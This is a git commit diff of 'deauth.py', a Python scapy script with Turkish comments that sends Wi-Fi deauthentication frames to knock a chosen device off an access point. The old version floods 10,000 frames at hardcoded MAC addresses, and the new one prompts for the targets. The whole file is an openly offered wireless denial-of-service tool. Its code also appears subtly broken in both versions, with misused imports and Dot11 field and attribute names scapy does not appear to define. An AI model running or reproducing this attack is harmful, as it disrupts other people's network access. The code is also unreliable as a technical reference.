8fdac916361f48503fc032a06e2255326435a46c
Muhammetcanpolat <73015593+mmc6185@users.noreply.github.com>
2023-09-24 10:57:14 +0300

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -1,15 +1,22 @@
-import sys 
-from scapy.all import *
+import scapy.all as scapy
 
-target_mac = "98:F6:21:83:ED:E0"
+def deauth(target_mac, ap_mac):
+    # Deauth paketi oluştur
+    deauth_packet = scapy.RadioTap()/scapy.Dot11(type=scapy.Dot11.DEAUTH,
+                                                 subtype=scapy.Dot11.AUTH_REQUEST,
+                                                 bssid=ap_mac,
+                                                 dest=target_mac)
 
-ap_mac = "00:5F:67:31:1C:F6"
+    # Paketi gönder
+    scapy.sendp(deauth_packet, iface="wlan0")
 
-radiotap = scapy.RadioTap()
 
+if __name__ == "__main__":
+    # Hedef MAC adresini gir
+    target_mac = input("Hedef MAC adresini girin: ")
 
-deauth_packet = scapy.Dot11(type = 0, subtype = 12, addr1 = target_mac, addr2 = sys.argv[1], addr3 = sys.argv[1]) 
+    # Erişim noktası MAC adresini gir
+    ap_mac = input("Erişim noktası MAC adresini girin: ")
 
-deauth_packet.add_payload(radiotap)
-
-sendp(deauth_packet, iface="wlan0mon", count = 10000, inter = .2)
+    # Deauth saldırısını başlat
+    deauth(target_mac, ap_mac)
